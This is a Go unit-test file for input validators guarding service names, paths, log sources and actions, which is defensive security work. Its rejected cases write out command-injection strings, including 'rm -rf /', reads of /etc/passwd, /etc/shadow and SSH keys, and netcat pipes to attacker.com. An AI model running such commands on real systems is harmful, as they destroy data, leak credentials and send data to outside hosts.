package security

import (
	"testing"
)

func TestValidateServiceName(t *testing.T) {
	tests := []struct {
		name        string
		serviceName string
		wantErr     bool
	}{
		// Valid service names
		{"valid simple", "nginx", false},
		{"valid with dash", "apache2", false},
		{"valid with underscore", "my_service", false},
		{"valid with dot", "service.name", false},
		{"valid complex", "nginx-proxy_v2.service", false},

		// Invalid service names - command injection attempts
		{"injection semicolon", "nginx; rm -rf /", true},
		{"injection ampersand", "nginx && cat /etc/passwd", true},
		{"injection pipe", "nginx | nc attacker.com 1234", true},
		{"injection backtick", "nginx`whoami`", true},
		{"injection dollar", "nginx$(whoami)", true},
		{"injection redirect", "nginx > /tmp/pwned", true},
		{"injection newline", "nginx\nwhoami", true},
		{"injection backslash", "nginx\\nrm", true},

		// Edge cases
		{"empty", "", true},
		{"too long", string(make([]byte, 300)), true},
		{"path traversal", "../../../etc/passwd", true},
		{"parentheses", "nginx()", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateServiceName(tt.serviceName)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateServiceName(%q) error = %v, wantErr %v", tt.serviceName, err, tt.wantErr)
			}
		})
	}
}

func TestValidatePath(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		// Valid paths
		{"valid absolute", "/var/log/nginx", false},
		{"valid deep", "/home/user/documents/file.txt", false},
		{"valid root", "/", false},

		// Invalid paths - security risks
		{"relative path", "var/log", true},
		{"path traversal dots", "/var/log/../../etc/passwd", true},
		{"path traversal simple", "..", true},
		{"sensitive shadow", "/etc/shadow", true},
		{"sensitive passwd", "/etc/passwd", true},
		{"sensitive sudoers", "/etc/sudoers", true},
		{"sensitive ssh key", "/root/.ssh/id_rsa", true},
		{"injection semicolon", "/var/log; cat /etc/passwd", true},
		{"injection pipe", "/var/log | nc attacker.com", true},
		{"empty", "", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePath(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePath(%q) error = %v, wantErr %v", tt.path, err, tt.wantErr)
			}
		})
	}
}

func TestValidateLogSource(t *testing.T) {
	tests := []struct {
		name    string
		source  string
		wantErr bool
	}{
		// Valid log sources
		{"valid nginx", "/var/log/nginx/access.log", false},
		{"valid syslog", "/var/log/syslog", false},
		{"valid apache", "/var/log/apache2/error.log", false},
		{"valid mysql", "/var/log/mysql/error.log", false},

		// Invalid log sources
		{"outside var log", "/home/user/file.log", true},
		{"etc passwd", "/etc/passwd", true},
		{"path traversal", "/var/log/../../../etc/shadow", true},
		{"injection", "/var/log/nginx; cat /etc/passwd", true},
		{"empty", "", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateLogSource(tt.source)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateLogSource(%q) error = %v, wantErr %v", tt.source, err, tt.wantErr)
			}
		})
	}
}

func TestValidateAction(t *testing.T) {
	tests := []struct {
		name    string
		action  string
		wantErr bool
	}{
		// Valid actions
		{"start", "start", false},
		{"stop", "stop", false},
		{"restart", "restart", false},
		{"status", "status", false},
		{"reload", "reload", false},
		{"enable", "enable", false},
		{"disable", "disable", false},

		// Invalid actions
		{"invalid", "invalid", true},
		{"injection", "start; rm -rf /", true},
		{"empty", "", true},
		{"uppercase", "START", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateAction(tt.action)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateAction(%q) error = %v, wantErr %v", tt.action, err, tt.wantErr)
			}
		})
	}
}

func TestSanitizeInput(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{"clean input", "nginx", "nginx"},
		{"with semicolon", "nginx; rm", "nginx_ rm"},
		{"with pipe", "test | grep", "test _ grep"},
		{"multiple dangerous", "a;b&c|d", "a_b_c_d"},
		{"empty", "", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeInput(tt.input)
			if result != tt.expected {
				t.Errorf("SanitizeInput(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

// Benchmark tests
func BenchmarkValidateServiceName(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ValidateServiceName("nginx-proxy_v2.service")
	}
}

func BenchmarkValidatePath(b *testing.B) {
	for i := 0; i < b.N; i++ {
		ValidatePath("/var/log/nginx/access.log")
	}
}
